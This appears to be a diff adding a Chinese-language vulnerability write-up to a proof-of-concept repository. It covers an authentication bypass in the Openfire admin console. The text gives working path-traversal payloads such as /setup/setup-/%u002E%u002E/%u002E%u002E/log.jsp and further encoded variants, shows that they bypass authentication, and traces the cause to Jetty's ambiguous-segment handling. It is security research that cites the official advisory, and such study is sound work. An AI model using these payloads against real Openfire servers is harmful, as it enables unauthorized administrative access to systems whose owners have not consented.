@@ -13,3 +13,82 @@ chmod +x ./openfire.sh
 ```
 即可监听在5005端口进行调试。
 
+payload:
+```
+/setup/setup-/../../log.jsp
+```
+
+![image](https://github.com/shadowsock5/Poc/assets/30398606/2e63de08-0853-49cb-b267-e050b57f7ce6)
+说明到这里的时候，不能有`%2e`。
+将`../../`进行unicode编码，得到：
+```
+/setup/setup-/\u002E\u002E/\u002E\u002E/log.jsp
+```
+
+![image](https://github.com/shadowsock5/Poc/assets/30398606/d3db00ec-f5c3-41d4-8648-ca43b14a4d83)
+
+虽然能过认证，但是响应是这样的：
+![image](https://github.com/shadowsock5/Poc/assets/30398606/ddd0cd28-6882-455e-bc6f-b5da33a34023)
+
+直接抄答案，
+```
+/setup/setup-/%u002E%u002E/%u002E%u002E/log.jsp
+```
+绕过了。
+![image](https://github.com/shadowsock5/Poc/assets/30398606/e7615e3e-f554-4c39-a058-46cc2c97ed4a)
+
+调试看一下为什么？
+
+注意这里的log.jsp并不是真的存在这个文件，而是在web.xml中有其映射的servlet。
+```xml
+    <servlet>
+        <servlet-name>org.jivesoftware.openfire.admin.log_jsp</servlet-name>
+        <servlet-class>org.jivesoftware.openfire.admin.log_jsp</servlet-class>
+    </servlet>
+...
+    <servlet-mapping>
+        <servlet-name>org.jivesoftware.openfire.admin.log_jsp</servlet-name>
+        <url-pattern>/log.jsp</url-pattern>
+    </servlet-mapping>
+```
+
+在这里下断点：
+org.jivesoftware.openfire.admin.log_jsp#_jspService
+
+![image](https://github.com/shadowsock5/Poc/assets/30398606/e7811e9d-0332-4242-94c9-ca1cb518afad)
+断下来之后往前回溯。
+![image](https://github.com/shadowsock5/Poc/assets/30398606/7ae5ced4-59e4-40f0-a618-46db5ac750fe)
+
+openfire\lib\jetty-servlet-9.4.43.v20210629.jar!\org\eclipse\jetty\servlet\ServletHolder.class# handle
+
+
+在这里
+openfire\lib\jetty-http-9.4.43.v20210629.jar!\org\eclipse\jetty\http\HttpURI.class
+看到了：
+```java
+
+    static {
+        __ambiguousSegments.put(".", Boolean.FALSE);
+        __ambiguousSegments.put("%2e", Boolean.TRUE);
+        __ambiguousSegments.put("%u002e", Boolean.TRUE);
+        __ambiguousSegments.put("..", Boolean.FALSE);
+        __ambiguousSegments.put(".%2e", Boolean.TRUE);
+        __ambiguousSegments.put(".%u002e", Boolean.TRUE);
+        __ambiguousSegments.put("%2e.", Boolean.TRUE);
+        __ambiguousSegments.put("%2e%2e", Boolean.TRUE);
+        __ambiguousSegments.put("%2e%u002e", Boolean.TRUE);
+        __ambiguousSegments.put("%u002e.", Boolean.TRUE);
+        __ambiguousSegments.put("%u002e%2e", Boolean.TRUE);
+        __ambiguousSegments.put("%u002e%u002e", Boolean.TRUE);
+    }
+```
+所以从这里面看，只有不包含`%2e`的，能变成..的应该都可以，比如：
+```
+/setup/setup-/.%u002e/.%u002e/log.jsp
+/setup/setup-/%u002e./%u002e./log.jsp
+```
+
+
+## Ref
+- https://mp.weixin.qq.com/s/cuULlP0F0Xf9Rhmkb-9H0g
+- https://github.com/igniterealtime/Openfire/security/advisories/GHSA-gw42-f939-fhvm
